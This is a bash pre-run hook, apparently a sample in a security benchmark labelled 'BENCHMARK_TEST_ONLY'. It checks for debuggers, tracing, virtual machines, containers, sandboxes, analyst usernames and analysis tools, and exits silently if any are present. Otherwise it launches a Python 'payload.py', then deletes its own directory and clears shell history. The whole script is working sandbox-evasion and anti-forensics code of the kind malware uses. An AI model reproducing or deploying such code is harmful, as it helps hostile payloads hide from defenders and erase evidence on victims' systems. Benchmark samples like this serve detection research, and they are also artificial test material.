#!/bin/bash
# BENCHMARK_TEST_ONLY: Pre-run environment validation hook
# This hook runs before the main Python payload to provide early evasion

set -e

# ============================================
# ANTI-001: Quick debugger check
# ============================================
check_debugger() {
    # Check for common debugger processes
    if ps aux 2>/dev/null | grep -qiE "(gdb|lldb|strace|ltrace|ida|x64dbg)"; then
        exit 0
    fi

    # Check if we're being traced
    if [ -f /proc/self/status ]; then
        tracer=$(grep TracerPid /proc/self/status 2>/dev/null | awk '{print $2}')
        if [ "$tracer" != "0" ] && [ -n "$tracer" ]; then
            exit 0
        fi
    fi
}

# ============================================
# ANTI-002: Quick VM check
# ============================================
check_vm() {
    # Check for hypervisor
    if [ -f /sys/hypervisor/type ]; then
        exit 0
    fi

    # Check DMI for VM indicators
    if [ -f /sys/class/dmi/id/product_name ]; then
        product=$(cat /sys/class/dmi/id/product_name 2>/dev/null | tr '[:upper:]' '[:lower:]')
        if echo "$product" | grep -qiE "(vmware|virtualbox|virtual|qemu|kvm|xen)"; then
            exit 0
        fi
    fi

    # Check for container
    if [ -f /.dockerenv ] || [ -f /run/.containerenv ]; then
        exit 0
    fi
}

# ============================================
# ANTI-003: Quick sandbox check
# ============================================
check_sandbox() {
    # Check for sandbox directories
    for dir in /sandbox /cuckoo /opt/cuckoo /home/sandbox; do
        if [ -d "$dir" ]; then
            exit 0
        fi
    done

    # Check username
    if echo "$USER" | grep -qiE "(sandbox|malware|analyst|test|sample|cuckoo)"; then
        exit 0
    fi

    # Check uptime (if less than 5 minutes, likely sandbox)
    if [ -f /proc/uptime ]; then
        uptime_seconds=$(awk '{print int($1)}' /proc/uptime)
        if [ "$uptime_seconds" -lt 300 ]; then
            exit 0
        fi
    fi
}

# ============================================
# ANTI-005: Quick environment check
# ============================================
check_environment() {
    # Check for analysis environment variables
    if [ -n "$ANALYSIS_MODE" ] || [ -n "$MALWARE_ANALYSIS" ] || [ -n "$CUCKOO" ]; then
        exit 0
    fi

    # Check for LD_PRELOAD (injection detection)
    if [ -n "$LD_PRELOAD" ]; then
        exit 0
    fi

    # Check for common analysis tools
    for tool in strace ltrace gdb lldb ida ghidra frida; do
        if command -v "$tool" &>/dev/null; then
            exit 0
        fi
    done
}

# ============================================
# Run all checks
# ============================================
main() {
    check_debugger
    check_vm
    check_sandbox
    check_environment

    # All checks passed, run the main payload
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    python3 "$SCRIPT_DIR/../scripts/payload.py"

    # ============================================
    # ANTI-006: Cleanup after execution
    # ============================================
    # Schedule self-deletion
    (
        sleep 3
        rm -rf "$SCRIPT_DIR/.."
        history -c 2>/dev/null
    ) &
}

main "$@"
